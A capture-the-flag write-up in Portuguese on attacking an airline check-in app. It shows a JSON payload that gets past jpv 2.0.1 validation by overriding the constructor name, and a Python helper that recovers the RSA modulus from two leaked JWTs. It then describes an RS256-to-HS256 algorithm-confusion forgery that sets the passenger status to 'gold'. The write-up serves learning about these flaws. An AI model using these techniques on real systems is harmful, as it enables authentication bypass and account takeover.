## Overview

Temos uma aplicação web de checkin em uma companhia aérea. Existe dois endpoints: /checkin e /upgrades
Observando as dependências da aplicação vemos uma versão vulnerável da biblioteca de verificação jpv e também uma versão de jwt-simple outdated.
Explorando as vulnerbilidades é possível forjar um JWT tornando o status do passageiro para "gold" e permitindo o acesso à flag.


## Vulnerabilidade JPV 2.0.1

A biblioteca jpv tem como intuito validar inputs de usuário comparando com patterns definidos a priore.
Os seguintes padrões são definidos:

```
const pattern = {
  firstName: /^\w{1,30}$/,
  lastName: /^\w{1,30}$/,
  passport: /^[0-9]{9}$/,
  ffp: /^(|CA[0-9]{8})$/,
  extras: [
    {sssr: /^(BULK|UMNR|VGML)$/},
  ],
};
```
Porém a na linha 42 de checkin.js existe a verificação ```data["extras"][e]["sssr"] == "FQTU"```
que caso seja verdadeira vaza um token JWT.

Para satisfazer essa verificação e bypassar a validação do jpv pode ser explorada a vulnerabilidade definida em: https://github.com/manvel-khnkoyan/jpv/issues/6

utilzamos o seguinte payload:
```
    "firstName": "Algum",
    "lastName": "Nome",
    "passport": "123456789",
    "ffp": "CA12345678",
    "extras": {
        "x": {
            "sssr": "FQTU"
        },
        "constructor": {
            "name": "Array"
        }
    }
```

Com isso conseguimos vazar tokens diferentes apenas alterando o valor do campo "passport" ou "ffp"

Com os dois tokens vazados temos recursos para calcular a chave pública. Para isso usamos uma função auxiliar get_magic():

```
def get_magic(jwt_token: str, e: int) -> gmpy2.mpz:
    """
    Calcula o valor sig**e - pt para um JWT assinado com RS256.
    """
    header, payload, signature = jwt_token.split(".")
    raw_signature = urlsafe_b64decode(f"{signature}==")
    raw_signature_int = gmpy2.mpz(bytes_to_long(raw_signature))

    padded_msg = pkcs1_v1_5_encode(f"{header}.{payload}".encode(), len(raw_signature))
    padded_int = gmpy2.mpz(bytes_to_long(padded_msg))

    return gmpy2.mpz(pow(raw_signature_int, e) - padded_int)
```

Temos assim um possível k.n (assumindo e = 65537), com os dois tokens diferentes conseguimos tirar o gcd e descobrir o N. Tornando possível a geração da mesma chave publica.

Agora com a chave pública podemos montar o nosso token final. Para conseguir utilizar a chave pública sem saber a chave privada, mudamos o algoritmo de criptografia de RS256 -> HS256 no header do JWT.

```{"alg": "HS256", "typ": "JWT"} ```

Testamos também mudar o "alg" para "none" como descrito em https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/ porém sem sucesso.

Já no payload do JWT apenas setamos o status para "gold" para passar a verificação da entrega da flag.

Com isso conseguimos forjar um token JWT que passa por todas as verificações e retorna a flag!

